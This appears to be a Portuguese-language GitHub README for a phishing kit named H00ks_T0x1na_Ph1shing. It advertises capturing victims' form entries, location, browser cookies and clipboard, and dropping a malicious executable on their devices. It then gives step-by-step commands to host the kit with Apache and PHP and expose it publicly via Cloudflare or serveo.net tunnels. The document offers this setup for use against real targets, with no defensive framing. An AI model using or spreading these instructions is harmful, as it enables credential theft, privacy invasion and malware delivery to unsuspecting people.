# H00ks_T0x1na_Ph1shing

Ferramenta de Phsishing Completa e Personalizavel e de Codigo livre.
![git-2](https://github.com/user-attachments/assets/fd355633-7191-4e43-9383-8ad5a1cb1107)

Precisa de um servidor externo como na foto cloudflare mas podem ser outros como OpenSSH.... 
[...]
![git-4](https://github.com/user-attachments/assets/52485404-da41-4b37-b284-8ac0cf4badb6)



Necessita do php para coletar os dados....

[...]

![git-5](https://github.com/user-attachments/assets/36866786-795e-4b70-af9a-5227213146e4)







Ferramenta completa de coleta de dados, desde informções do formulario que é personalizavel, tem coleta de localização, cookies do navegador (Não manipulavel, favor cofigurar corretamente no beef).... E personalizavel ao ponto de poder trocar a imagem de fundo


Porem salve a imagem do fundo da pagina sempre como "1.jpg" e coloquem o arquivo malicioso como "arquivo.exe" ou troque se prefirir o arquivo "arquivo.exe" no codigo da pagina
![git-3](https://github.com/user-attachments/assets/fa8cc3ce-a99b-49c3-bf6a-b79bef5177d6)



Volta as informaçoes em dados.txt... Localização (volta em longitude e a latitude (Localização: Lat: loc do alvo Long: loc do alvo)), se tem cookies no navegador, volta o formulario digitado, sobe uma carga maliciosa no dispositivo da vitima pelo navegador, e captura a clipboard da vitima .... ![git](https://github.com/user-attachments/assets/fa257869-aafb-4b1c-a28b-029a872c6b15)


Com Cloud Flare:

Baixe e Inicie o Servidor Apache2:
"sudo apt-get install apache2 -y"
"sudo systemctl start apache2 && sudo systemctl enable apache2.service"

Baixe o php:
"sudo apt-get install php -y"

Inicie o php:
"php -S localhost:8080"

Instale o CloudFlare desta maneira:
"curl -O https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.deb
sudo dpkg -i cloudflared-stable-linux-amd64.deb"

Faça login no cloudflare e crie a conta:
"cloudflared tunnel login"

Inicie o servidor cloudflare:
"cloudflared tunnel --url http://localhost:8080"

Diretorios corretos:
"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
"mkdir uploads && cd ../"
"chmod +x H00ks_T0x1na_Ph1shing/*"
"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"

or

Baixe e Inicie o Servidor Apache2:
"sudo apt-get install apache2"
"sudo systemctl start apache2 && sudo systemctl enable apache2.service"

Baixe o php:
"sudo apt-get install php -y"


Inicie o php:
php -S localhost:8080

Use o OpenSSH detsa maneira:
"ssh -R 80:localhost:443 serveo.net"

Diretorios corretos:
"git clone https://github.com/z3ldr1/H00ks_T0x1na_Ph1shing.git && cd H00ks_T0x1na_Ph1shing"
"mkdir uploads && cd ../"
"chmod +x H00ks_T0x1na_Ph1shing/*"
"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"


Hacked By: z3ldr1s
Vulgo: ZEL ZEL

Aproveite :)
